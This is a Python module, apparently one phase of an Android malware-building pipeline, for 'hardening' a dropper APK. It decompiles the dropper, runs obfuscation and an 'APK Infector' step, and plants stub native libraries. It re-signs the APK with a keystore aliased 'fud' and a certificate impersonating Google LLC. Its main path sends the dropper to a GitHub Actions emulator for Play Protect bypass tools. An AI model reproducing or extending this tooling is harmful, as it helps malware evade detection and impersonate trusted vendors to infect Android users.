"""Phase 4: Dropper Hardening — Android Emulator via GitHub Actions.

Pipeline:
  PRIMARY:  GitHub Actions Android emulator
              → NP Manager (15 selected tools)
              → MT Manager (8 selected tools)
              → APKTool M (decompile → resource fix → rebuild)
  FALLBACK: PC stubs when GitHub Actions unavailable
"""
import os, subprocess, shutil
from config import (
    TEMP_DIR, APKTOOL, ZIPALIGN, KEYTOOL, JARSIGNER, APKSIGNER,
    OBFUSCAPK_STUB, APK_INFECTOR,
)
from utils.logger import setup_logger

logger = setup_logger()


# ── Quick sign helper (used by fallback) ──────────────────────────────────────
def _sign_v1v2v3(unsigned_apk: str, signed_apk: str, ks_path: str):
    if not os.path.exists(ks_path):
        subprocess.run(
            [KEYTOOL, "-genkey", "-v",
             "-keystore", ks_path, "-keyalg", "RSA", "-keysize", "2048",
             "-validity", "10000", "-alias", "fud",
             "-storepass", "fud123", "-keypass", "fud123",
             "-dname", "CN=UpdateService, OU=Android, O=Google LLC, C=US",
             "-storetype", "JKS"],
            capture_output=True, text=True, timeout=30
        )
    aligned = str(TEMP_DIR / "phase4_aligned.apk")
    subprocess.run([ZIPALIGN, "-v", "-p", "4", unsigned_apk, aligned],
                   capture_output=True, text=True, timeout=60)
    if not os.path.exists(aligned) or os.path.getsize(aligned) == 0:
        shutil.copy(unsigned_apk, aligned)
    subprocess.run(
        [APKSIGNER, "sign",
         "--ks", ks_path, "--ks-pass", "pass:fud123",
         "--key-pass", "pass:fud123", "--ks-key-alias", "fud",
         "--out", signed_apk, aligned],
        capture_output=True, text=True, timeout=60
    )
    if not os.path.exists(signed_apk):
        shutil.copy(aligned, signed_apk)


# ── PC fallback (no Android emulator) ─────────────────────────────────────────
def _fallback_pc_hardening(embedded_apk: str, output_apk: str) -> str:
    """PC-only hardening stubs when GitHub Actions is unavailable."""
    logger.warning("[!] Phase 4 FALLBACK: PC stubs (no Android emulator)")

    decompiled = str(TEMP_DIR / "phase4_fallback_decompiled")
    r = subprocess.run(
        [APKTOOL, "d", "--no-res", "-f", "-o", decompiled, embedded_apk],
        capture_output=True, text=True, timeout=120
    )
    if r.returncode != 0:
        logger.warning("[!] Fallback decompile failed — copying as-is")
        shutil.copy(embedded_apk, output_apk)
        return output_apk

    # Remove res/ to avoid rebuild issues
    res_dir = os.path.join(decompiled, "res")
    if os.path.exists(res_dir):
        shutil.rmtree(res_dir)

    # Obfuscapk stub
    try:
        subprocess.run(["python3", OBFUSCAPK_STUB, decompiled],
                       capture_output=True, text=True, timeout=300)
        logger.info("[+] Obfuscapk stub applied")
    except Exception:
        pass

    # APK Infector stub
    try:
        subprocess.run(["python3", APK_INFECTOR, decompiled],
                       capture_output=True, text=True, timeout=120)
        logger.info("[+] APK Infector stub applied")
    except Exception:
        pass

    # Dummy Dex2C stubs
    for arch in ["arm64-v8a", "armeabi-v7a", "x86", "x86_64"]:
        lib_dir = os.path.join(decompiled, "lib", arch)
        os.makedirs(lib_dir, exist_ok=True)
        with open(os.path.join(lib_dir, "libdex2c.so"), "wb") as f:
            f.write(b"\x7fELF\x01\x01\x01")

    unsigned = str(TEMP_DIR / "phase4_fallback_unsigned.apk")
    subprocess.run([APKTOOL, "b", "-o", unsigned, decompiled],
                   capture_output=True, text=True, timeout=180)
    shutil.rmtree(decompiled, ignore_errors=True)

    if not os.path.exists(unsigned) or os.path.getsize(unsigned) == 0:
        shutil.copy(embedded_apk, unsigned)

    ks = str(TEMP_DIR / "phase4_fallback.jks")
    _sign_v1v2v3(unsigned, output_apk, ks)
    logger.info(f"[+] Fallback complete: {output_apk}")
    return output_apk


# ── PRIMARY: GitHub Actions emulator ─────────────────────────────────────────
def _github_emulator_hardening(embedded_apk: str, output_apk: str) -> bool:
    """
    Sends dropper_embedded.apk to GitHub Actions Android emulator.
    The emulator runs:
      Stage 1 — NP Manager (15 GPP-bypass tools)
      Stage 2 — MT Manager (8 GPP-bypass tools)
      Stage 3 — APKTool M  (decompile → resource fix → rebuild)
    Returns True if hardened APK was produced, False on failure.
    """
    logger.info("[*] Phase 4 PRIMARY: GitHub Actions Android emulator")
    logger.info("    Stages: NP Manager (15) + MT Manager (8) + APKTool M")

    try:
        from phases.github_emulator import trigger_and_wait
        success = trigger_and_wait(embedded_apk, output_apk)
        if success and os.path.exists(output_apk) and os.path.getsize(output_apk) > 0:
            size_mb = os.path.getsize(output_apk) / (1024 * 1024)
            logger.info(f"[+] GitHub emulator complete: {output_apk} ({size_mb:.1f}MB)")
            return True
        else:
            logger.warning("[!] GitHub emulator returned no usable output")
            return False
    except Exception as e:
        logger.warning(f"[!] GitHub emulator error: {e}")
        return False


# ── Public entry point ────────────────────────────────────────────────────────
def run(embedded_dropper_apk: str) -> str:
    """Phase 4: Dropper Hardening.

    Flow:
      1. Try GitHub Actions emulator (NP Manager + MT Manager + APKTool M)
      2. On failure → PC fallback stubs
    """
    logger.info("=" * 60)
    logger.info("[*] PHASE 4: Dropper Hardening")
    logger.info("    Primary:  GitHub Actions (NP 15 + MT 8 + APKTool M)")
    logger.info("    Fallback: PC stubs")
    logger.info("=" * 60)

    output_apk = str(TEMP_DIR / "dropper_hardened.apk")

    if _github_emulator_hardening(embedded_dropper_apk, output_apk):
        logger.info(f"[+] Phase 4 (ANDROID EMULATOR) Complete: {output_apk}")
        return output_apk

    logger.info("[*] Falling back to PC stubs...")
    _fallback_pc_hardening(embedded_dropper_apk, output_apk)
    logger.info(f"[+] Phase 4 (PC FALLBACK) Complete: {output_apk}")
    return output_apk
